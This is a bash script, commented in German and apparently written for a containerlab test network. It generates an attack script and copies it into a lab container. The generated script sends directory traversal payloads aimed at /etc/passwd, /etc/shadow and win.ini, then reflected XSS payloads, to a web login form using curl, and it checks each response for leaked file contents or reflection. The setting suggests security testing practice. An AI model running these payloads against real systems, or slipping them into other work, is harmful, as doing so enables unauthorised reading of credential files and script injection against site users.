#!/bin/bash

# Das Shell-Skript auf deinem Host erzeugen
cat << EOF > /tmp/xss_path_attack_simple.sh
#!/bin/sh

TARGET_URL="https://10.0.2.30:8443/"
VERIFY_SSL="-k"

echo "=========================================="
echo "== Directory Traversal Angriff mit Curl ==="
echo "=========================================="

for s in "../../../../etc/passwd" "../../../../../windows/win.ini" "/etc/shadow" "..\\..\\..\\..\\etc\\passwd"; do
    echo "[+] Versuche Directory Traversal mit: \$s"
    response=\$(curl \$VERIFY_SSL -s -X POST "\$TARGET_URL" --data "username=\$s&password=irrelevant")
    if echo "\$response" | grep -q "root:" || echo "\$response" | grep -q "daemon:" || echo "\$response" | grep -q "\[extensions\]" ; then
        echo "[!!!] Offen: Directory Traversal möglich! Response enthält sensitive Datei."
    else
        echo "[-] Kein Zugriff oder keine offensichtlichen Daten im Response."
    fi
    sleep 1
done
echo "[+] Directory Traversal Test abgeschlossen."
echo

echo "=========================================="
echo "== XSS Angriff auf Login-Feld mit Curl ==="
echo "=========================================="

for payload in "<script>alert('XSS!')</script>" "<img src=x onerror=alert('XSS')>" "<svg/onload=alert(1)>"; do
    echo "[+] Sende XSS-Payload ans Login-Formular: \$payload"
    response=\$(curl \$VERIFY_SSL -s -X POST "\$TARGET_URL" --data "username=\$payload&password=irrelevant")
    if echo "\$response" | grep -Fq "\$payload" ; then
        echo "[!!!] XSS erfolgreich! Payload wird im Response reflektiert."
    else
        echo "[-] Kein XSS gefunden."
    fi
    sleep 1
done
echo "[+] XSS Tests abgeschlossen."
EOF

chmod +x /tmp/xss_path_attack_simple.sh

# In den Container kopieren
echo "[+] Kopiere Testskript in den Internal_Client2-Container..."
sudo docker cp /tmp/xss_path_attack_simple.sh clab-MaJuVi-Internal_Client2:/root/xss_path_attack_simple.sh
echo "  Skript installiert!"
echo "Führe es im Container aus mit:"
echo "  sh /root/xss_path_attack_simple.sh"
